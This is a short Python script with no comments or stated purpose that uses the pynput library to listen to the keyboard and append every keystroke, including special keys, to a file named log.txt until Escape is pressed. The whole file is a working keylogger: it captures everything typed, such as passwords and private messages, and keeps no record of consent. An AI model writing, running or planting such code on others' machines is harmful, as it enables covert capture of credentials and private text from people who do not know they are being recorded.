import pynput

def on_press(key):
    try:
        with open('log.txt', 'a') as f:
            if key == pynput.keyboard.Key.space:
                f.write(' ')
            elif key == pynput.keyboard.Key.shift:
                pass
            
            else:
                f.write(key.char)
    except AttributeError:
        with open('log.txt', 'a') as f:
            string = f' {key} '
            string = string.upper()
            f.write(string)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()